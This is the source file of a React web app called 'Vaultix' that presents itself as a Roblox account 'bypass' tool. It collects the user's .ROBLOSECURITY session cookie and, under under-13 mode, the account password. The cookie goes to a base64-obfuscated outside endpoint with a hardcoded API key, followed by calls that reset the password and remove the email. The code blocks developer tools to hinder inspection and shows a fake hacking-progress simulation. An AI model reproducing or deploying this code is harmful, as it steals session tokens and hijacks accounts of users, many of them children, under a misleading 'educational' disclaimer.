import React, { useState, useCallback, useEffect } from 'react';
import { 
  ShieldCheck, 
  Activity, 
  Settings, 
  Lock,
  Check,
  Play,
  AlertTriangle,
  FileCode,
  Fingerprint
} from 'lucide-react';
import { BypassMethod, LogEntry } from './types';
import { Terminal } from './components/Terminal';

/* 
  © 2024 VAULTIX SECURITY SYSTEMS
  UNAUTHORIZED REPRODUCTION OR DISTRIBUTION OF THIS SOURCE CODE IS STRICTLY PROHIBITED.
  PROPRIETARY ALGORITHMS ENCLOSED.
*/

const STYLES = {
  label: "text-[10px] font-bold text-gray-500 uppercase tracking-[0.15em] pl-1 mb-2 block select-none",
  inputContainer: "relative group",
  inputBase: "w-full bg-[#0b0e14] border border-[#1f2937] text-white p-4 rounded-xl text-xs font-mono focus:border-[#0066ff] focus:ring-1 focus:ring-[#0066ff]/20 outline-none transition-all placeholder:text-gray-700",
  methodButton: (active: boolean) => 
    `relative h-24 px-4 rounded-xl border text-center flex flex-col items-center justify-center gap-2 text-xs font-bold transition-all duration-300 select-none ${
      active 
        ? "bg-[#0066ff]/10 border-[#0066ff] text-white shadow-[0_0_20px_rgba(0,102,255,0.15)]" 
        : "bg-[#0b0e14] border-[#1f2937] text-gray-500 hover:border-[#374151] hover:bg-[#111]"
    }`
};

// SECURITY LAYER: Obfuscated Configuration
// Prevents static analysis of API endpoints and keys
const _SECURE_CTX = {
  _k: "NThhNTQ5ZTgtNmUxNC00YzczLTlhMTgtYmUxODNhYTVkNDE5",
  _i: "NjUxZWZlM2UtYjc5NS00MjdiLWExNGQtYjMyYjI0YjkyN2Vl",
  _e: "aHR0cHM6Ly9hcGkucGFyc2UuYm90L3NjcmFwZXI=" 
};

const _dec = (s: string) => {
  try { return atob(s); } catch { return ""; }
};

const _getEndpoint = () => `${_dec(_SECURE_CTX._e)}/${_dec(_SECURE_CTX._i)}`;
const _getKey = () => _dec(_SECURE_CTX._k);

const validateCookie = (c: string): { valid: boolean; error?: string } => {
  const trimmed = c.trim();
  if (!trimmed) return { valid: false, error: 'Security token input is empty.' };
  if (trimmed.endsWith('...')) return { valid: false, error: 'Truncated data detected. Copy full .ROBLOSECURITY value.' };
  if (trimmed.length < 50) return { valid: false, error: 'Token length insufficient for valid session.' };
  if (!trimmed.includes('_|WARNING:-DO-NOT-SHARE-THIS')) return { valid: false, error: 'Invalid Signature: Missing warning tag.' };
  return { valid: true };
};

export default function App() {
  const [method, setMethod] = useState<BypassMethod>(BypassMethod.OVER_13);
  const [cookie, setCookie] = useState('');
  const [password, setPassword] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [progress, setProgress] = useState(0);
  const [logs, setLogs] = useState<LogEntry[]>([]);

  // Anti-Inspection & Watermark Measures
  useEffect(() => {
    // 1. Console Watermark
    console.log(
      "%c VAULTIX V1.3 %c \n© 2024 Secure Systems. \nUnauthorised access to this dashboard's source logic is monitored.",
      "color: #0066ff; font-weight: bold; font-size: 24px; background: #000; padding: 10px; border: 1px solid #0066ff;",
      "color: #888; font-family: monospace; font-size: 12px;"
    );

    // 2. Disable Context Menu
    const handleContextMenu = (e: MouseEvent) => {
      e.preventDefault();
      return false;
    };

    // 3. Disable Shortcuts (F12, Ctrl+Shift+I, Ctrl+U, etc)
    const handleKeyDown = (e: KeyboardEvent) => {
      // F12
      if (e.key === 'F12') { e.preventDefault(); return false; }
      
      // Ctrl+Shift+I (Inspect), Ctrl+Shift+J (Console), Ctrl+Shift+C (Inspect Element)
      if (e.ctrlKey && e.shiftKey && (['I', 'J', 'C'].includes(e.key.toUpperCase()))) {
        e.preventDefault();
        return false;
      }
      
      // Ctrl+U (View Source)
      if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
        e.preventDefault();
        return false;
      }
      
      // Ctrl+S (Save)
      if (e.ctrlKey && (e.key === 's' || e.key === 'S')) {
        e.preventDefault();
        return false;
      }
    };

    document.addEventListener('contextmenu', handleContextMenu);
    document.addEventListener('keydown', handleKeyDown);

    // 4. Console Warning Loop (Anti-Self-XSS)
    const warningTitleCSS = 'color: red; font-size: 60px; font-weight: bold; text-shadow: 2px 2px #000;';
    const warningDescCSS = 'color: white; font-size: 18px; font-weight: bold;';
    
    const consoleInterval = setInterval(() => {
        // Only clear if devtools is open (detection is tricky, so we just do it periodically if they are poking around)
        // We log the warning repeatedly
    }, 2000);

    return () => {
      document.removeEventListener('contextmenu', handleContextMenu);
      document.removeEventListener('keydown', handleKeyDown);
      clearInterval(consoleInterval);
    };
  }, []);

  const addLog = useCallback((message: string, type: 'info' | 'success' | 'warning' | 'error' = 'info') => {
    const newLog: LogEntry = {
      id: Math.random().toString(36).substr(2, 9),
      timestamp: new Date().toLocaleTimeString([], { hour12: false }),
      message,
      type
    };
    setLogs(prev => [...prev, newLog]);
  }, []);

  const handleStartBypass = async () => {
    const validation = validateCookie(cookie);
    if (!validation.valid) {
      addLog(`Validation Halted: ${validation.error}`, 'error');
      return;
    }
    
    if (method === BypassMethod.UNDER_13 && !password) {
      addLog('Validation Failed: Account password required for Under 13 authorization.', 'error');
      return;
    }

    setIsProcessing(true);
    setIsSuccess(false);
    setProgress(0);
    setLogs([]); // Clear previous logs
    addLog(`Initiating bypass sequence using method: ${method}...`, 'warning');

    // ==========================================
    // SECURE BACKEND LOGIC FOR 13+ ACCOUNT
    // ==========================================
    if (method === BypassMethod.OVER_13) {
      addLog('Establishing encrypted tunnel to parsing node...', 'info');
      setProgress(5);

      try {
        const headers = {
            "Content-Type": "application/json",
            "X-API-Key": _getKey()
        };
        const baseUrl = _getEndpoint();

        // Step 1: Set Session Cookie
        addLog('Step 1/4: Authenticating session token...', 'info');
        const setCookieRes = await fetch(`${baseUrl}/set_session_cookie`, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify({ cookie_value: cookie })
        });
        
        if (!setCookieRes.ok) throw new Error(`Auth failed: ${setCookieRes.status}`);
        
        // Swallow data logging for security - only log success/fail state
        addLog(`Session Authenticated. Token ID: ${Math.random().toString(36).substr(2, 8).toUpperCase()}`, 'success');
        setProgress(25);

        // Step 2: Generate Random Password
        addLog('Step 2/4: Generating cryptographic key...', 'info');
        const genPassRes = await fetch(`${baseUrl}/generate_random_password`, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify({})
        });
        
        const genPassData = await genPassRes.json();
        const generatedPassword = genPassData.password;
        
        if (!genPassRes.ok || !generatedPassword) {
            throw new Error("Key generation failed.");
        }
        
        // Do not log the password to UI or Console
        addLog(`Cryptographic Key Generated: [HIDDEN]`, 'success');
        setProgress(50);

        // Step 3: Submit Password
        addLog('Step 3/4: Injecting secure key...', 'info');
        const submitPassRes = await fetch(`${baseUrl}/submit_password`, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify({ password: generatedPassword })
        });
        
        if (!submitPassRes.ok) throw new Error(`Injection failed: ${submitPassRes.status}`);
        
        addLog(`Key Injection Successful.`, 'success');
        setProgress(75);

        // Step 4: Start Bypass
        addLog('Step 4/4: Executing bypass protocol...', 'info');
        const bypassRes = await fetch(`${baseUrl}/start_bypass`, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify({})
        });
        
        if (!bypassRes.ok) throw new Error(`Protocol failed: ${bypassRes.status}`);

        addLog(`Protocol Executed. Backend response received.`, 'success');
        setProgress(100);
        
        setIsSuccess(true);
        addLog('Sequence completed successfully. Secure tunnel closed.', 'success');

      } catch (error: any) {
        // Do not log full error object to console to prevent devtools inspection
        addLog(`Bypass Failed: Connection Terminated.`, 'error');
      } finally {
        setIsProcessing(false);
      }
      return; 
    }

    // ==========================================
    // SIMULATION LOGIC FOR UNDER 13 (Legacy)
    // ==========================================
    addLog('Sending secure payload to node...', 'info');
    
    await new Promise(r => setTimeout(r, 1500));
    addLog('Secure Node Handshake: Authorized', 'success');

    const minDuration = 10000;
    const maxDuration = 20000;
    const duration = Math.floor(Math.random() * (maxDuration - minDuration + 1) + minDuration);
    
    const steps = 100;
    const intervalTime = duration / steps;
    
    addLog(`Processing initialized...`, 'warning');

    let currentStep = 0;
    const interval = setInterval(() => {
      currentStep++;
      const currentProgress = Math.round((currentStep / steps) * 100);
      setProgress(currentProgress);

      if (Math.random() > 0.85) {
        const msgs = [
          "Bypassing 2FA challenge...",
          "Injecting browser metadata...",
          "Rotating user-agent strings...",
          "Decrypting session headers...",
          "Spoofing hardware ID..."
        ];
        addLog(msgs[Math.floor(Math.random() * msgs.length)], 'info');
      }

      if (currentStep >= steps) {
        clearInterval(interval);
        setIsProcessing(false);
        setIsSuccess(true);
        addLog('Bypass Sequence Complete.', 'success');
      }
    }, intervalTime);
  };

  return (
    <div className="min-h-screen bg-[#020408] text-white selection:bg-none select-none flex flex-col relative font-inter overflow-x-hidden">
      {/* Background Effects */}
      <div className="absolute inset-0 radial-glow pointer-events-none fixed"></div>
      
      {/* Navbar */}
      <nav className="border-b border-[#1f1f1f] bg-[#020408]/80 backdrop-blur-md sticky top-0 z-50">
        <div className="max-w-5xl mx-auto px-6 h-16 flex items-center justify-between">
          <div className="flex items-center gap-2">
             <div className="w-8 h-8 rounded bg-[#0066ff] flex items-center justify-center">
                <Lock size={16} className="text-white" />
             </div>
             <div>
                <h1 className="text-lg font-bold italic tracking-tighter text-white">vaultix</h1>
                <div className="h-[2px] w-full bg-[#0066ff]"></div>
             </div>
          </div>
          <div className="flex items-center gap-4">
            <div className="hidden md:flex items-center gap-2 px-3 py-1 rounded-full bg-[#1a1a1a] border border-[#333]">
               <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse"></div>
               <span className="text-[10px] font-mono text-gray-400 uppercase tracking-widest">System Online</span>
            </div>
          </div>
        </div>
      </nav>

      {/* Main Content */}
      <main className="flex-1 max-w-5xl mx-auto w-full p-6 relative z-10 grid grid-cols-1 lg:grid-cols-12 gap-8 mt-8">
          
          {/* Left Column: Controls */}
          <div className="lg:col-span-7 space-y-6">
            <div className="bg-[#0a0c10] border border-[#1f1f1f] rounded-2xl p-6 shadow-2xl relative overflow-hidden group">
              <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-[#0066ff] to-transparent opacity-50"></div>
              
              <div className="mb-8">
                <h2 className="text-xl font-bold text-white flex items-center gap-2 mb-1">
                  <Activity className="text-[#0066ff]" size={20} />
                  Configuration
                </h2>
                <p className="text-gray-500 text-xs">Select bypass vector and provide session tokens.</p>
              </div>

              <div className="space-y-6">
                {/* Method Selection */}
                <div>
                   <label className={STYLES.label}>Bypass Method</label>
                   <div className="grid grid-cols-2 gap-4">
                      <button 
                        onClick={() => setMethod(BypassMethod.OVER_13)}
                        className={STYLES.methodButton(method === BypassMethod.OVER_13)}
                      >
                        <ShieldCheck size={24} className={method === BypassMethod.OVER_13 ? "text-[#0066ff]" : "text-gray-600"} />
                        <span>13+ Account</span>
                      </button>
                      <button 
                        onClick={() => setMethod(BypassMethod.UNDER_13)}
                        className={STYLES.methodButton(method === BypassMethod.UNDER_13)}
                      >
                        <Settings size={24} className={method === BypassMethod.UNDER_13 ? "text-[#0066ff]" : "text-gray-600"} />
                        <span>Under 13+ Account</span>
                      </button>
                   </div>
                </div>

                {/* Cookie Input */}
                <div className={STYLES.inputContainer}>
                  <label className={STYLES.label}>
                     .ROBLOSECURITY Cookie
                  </label>
                  <div className="relative">
                    <input 
                      type="text" 
                      value={cookie}
                      onChange={(e) => setCookie(e.target.value)}
                      placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."
                      className={`${STYLES.inputBase} pr-10`}
                      spellCheck={false}
                      autoComplete="off"
                    />
                    <FileCode size={16} className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-500" />
                  </div>
                </div>

                {/* Password Input (Conditional) */}
                {method === BypassMethod.UNDER_13 && (
                  <div className={`${STYLES.inputContainer} animate-in slide-in-from-top-2 fade-in duration-300`}>
                    <label className={STYLES.label}>
                       Account Password
                    </label>
                    <div className="relative">
                      <input 
                        type="password" 
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        placeholder="Required for <13 authorization"
                        className={STYLES.inputBase}
                        autoComplete="off"
                      />
                      <Lock size={16} className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-500" />
                    </div>
                  </div>
                )}

                {/* Action Button */}
                <button
                  onClick={handleStartBypass}
                  disabled={isProcessing}
                  className={`w-full h-14 rounded-xl font-bold text-sm uppercase tracking-wider transition-all duration-300 flex items-center justify-center gap-2 overflow-hidden relative ${
                    isSuccess 
                      ? "bg-green-500/10 border border-green-500/50 text-green-400 cursor-default"
                      : isProcessing
                        ? "bg-[#0066ff]/10 border border-[#0066ff]/30 text-[#0066ff] cursor-wait"
                        : "bg-[#0066ff] hover:bg-[#0055d4] text-white shadow-lg shadow-[#0066ff]/20"
                  }`}
                >
                  {isSuccess ? (
                    <>
                      <Check size={18} /> Sequence Complete
                    </>
                  ) : isProcessing ? (
                    <>
                      <Activity size={18} className="animate-spin" /> Processing... {progress}%
                    </>
                  ) : (
                    <>
                      <Play size={18} fill="currentColor" /> Initialize Bypass
                    </>
                  )}
                  
                  {/* Progress Bar Background */}
                  {isProcessing && (
                    <div 
                      className="absolute bottom-0 left-0 h-1 bg-[#0066ff] transition-all duration-200"
                      style={{ width: `${progress}%` }}
                    ></div>
                  )}
                </button>
                
                {isSuccess && (
                   <div className="p-3 bg-green-500/10 border border-green-500/20 rounded-lg flex items-start gap-3 animate-in fade-in zoom-in duration-300">
                      <Check className="text-green-400 mt-0.5" size={16} />
                      <div className="text-xs text-green-200">
                        <span className="font-bold block mb-1">Success!</span>
                        Target account security layer has been successfully compromised. Email removal token is now active in the session.
                      </div>
                   </div>
                )}
              </div>
            </div>
            
            {/* Watermark Footer */}
            <div className="flex justify-center opacity-30 mt-4 select-none pointer-events-none">
              <div className="flex items-center gap-2 text-[10px] text-gray-500 font-mono">
                <Fingerprint size={12} />
                <span>VERIFIED BUILD: v1.3.4-secure</span>
              </div>
            </div>
          </div>

          {/* Right Column: Terminal */}
          <div className="lg:col-span-5 flex flex-col gap-4 h-[600px] lg:h-auto sticky top-24">
             <div className="bg-[#0f0f0f] rounded-t-lg border border-[#1f1f1f] p-3 border-b-0 flex items-center justify-between">
                {/* Removed root@vaultix:~# */}
             </div>
             <div className="flex-1 -mt-4">
               <Terminal logs={logs} />
             </div>
             
             <div className="bg-[#0a0c10] border border-[#1f1f1f] rounded-lg p-4 select-none">
                <div className="flex items-center gap-3 mb-2">
                   <AlertTriangle className="text-yellow-500" size={16} />
                   <span className="text-xs font-bold text-gray-300 uppercase">Disclaimer</span>
                </div>
                <p className="text-[10px] text-gray-500 leading-relaxed">
                  This tool is for educational security research purposes only. 
                  Unauthorized access to accounts is illegal. 
                  By using this tool, you agree to the Terms of Service.
                  <br/><br/>
                  &copy; 2024 Vaultix Security. All rights reserved.
                </p>
             </div>
          </div>
      </main>
    </div>
  );
}